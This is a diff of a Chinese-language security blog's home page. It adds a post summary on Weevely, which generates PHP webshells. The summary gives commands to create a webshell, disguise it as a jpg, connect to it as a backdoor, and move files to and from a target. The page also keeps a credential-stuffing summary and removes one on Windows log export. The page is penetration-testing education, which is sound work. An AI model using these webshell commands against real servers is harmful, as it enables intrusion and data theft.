@@ -55,6 +55,20 @@
 </header><main class="main">
                 <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-subtitle">資訊安全相關內容分享</div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/introduction-to-weevely-php-webshell/">工具介紹-Weevely (kali linux web shell產生工具)</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-07">2022-02-07</time></span></div><div class="content">Weevely是使用python寫成的webshell管理工具，可產生php webshell。
+產生Webshell 使用以下指令產生webshell，要注意密碼用特殊字元有時會造成連線失敗。
+如果要產生圖片檔，以jpg命名結尾就可以了。
+weevely generate 567 hello.php 連線Webshell 上傳後使用以下指令連線後門，然後進入一個互動式的shell
+weevely http://urltowebshell/hello.php 567 如果是使用jpg的檔案，一樣直接連線該檔案就行。
+利用Webshell下載檔案 從遠端下載檔案，rpath是遠端路行 lpath是要存的本地路徑(都要包含檔名)
+file.download rpath lpath [-vector]
+利用Webshell上傳檔案 使用:file_upload2web指令可以檔案上傳到目標主機
+:file_upload2web lpath rpath
+:file\_upload2web /home/kali/Desktop/test.exe test.exe 延伸閱讀 資安監控-rever shell監控方法 工具介紹-Python-Backdoor 網頁攻擊手法-上傳弱點 參考資料 https://www.kali.org/tools/weevely https://securityonline.info/weevely-tutorial-php-webshell/ https://github.com/epinna/weevely3 </div><div class="post-footer">
+        <a href="/posts/introduction-to-weevely-php-webshell/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kali-linux/">Kali Linux</a>,&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/">滲透測試</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E6%92%9E%E5%BA%AB%E6%94%BB%E6%93%8A/">密碼破解-撞庫攻擊</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-06">2022-02-06</time></span></div><div class="content">撞庫攻擊是密碼破解的一種手法，駭客利用A網站洩露的帳密來登入B網站。基本思考方式是，「人在不同網站有很大的機會用同一組帳密」。
 偵測與防範的手法 2階段驗證(2FA)，是能有效防止的一種方式。
@@ -117,13 +131,6 @@ MSExchange Management.evtx MSExchange Management log 記錄了 Exchange 的操�
 延伸閱讀 Windows IR 方向 IIS log 位置 參考資料 https://docs.</div><div class="post-footer">
         <a href="/posts/location-of-windows-event-log/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/audit-log/">Audit Log</a>,&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/%E8%B3%87%E5%AE%89%E9%91%91%E8%AD%98/">資安鑑識</a>,&nbsp;<a href="/tags/log/">LOG</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/introduction-to-windows-wevtutil-command/">資訊安全-Wevtutil 日誌指令</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2021-11-01">2021-11-01</time></span></div><div class="content">Windows 日誌匯出指令
-wevtutil epl System C:\\backup\\system0506.evtx gl Displays configuration information for the specified log, which includes whether the log is enabled or not, the current maximum size limit of the log, and the path to the file where the log is stored.
-延伸閱讀 資訊安全-Windows Event Log位置 資訊安全-IIS log 位置 參考資料 https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil</div><div class="post-footer">
-        <a href="/posts/introduction-to-windows-wevtutil-command/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/windows-server/">windows server</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
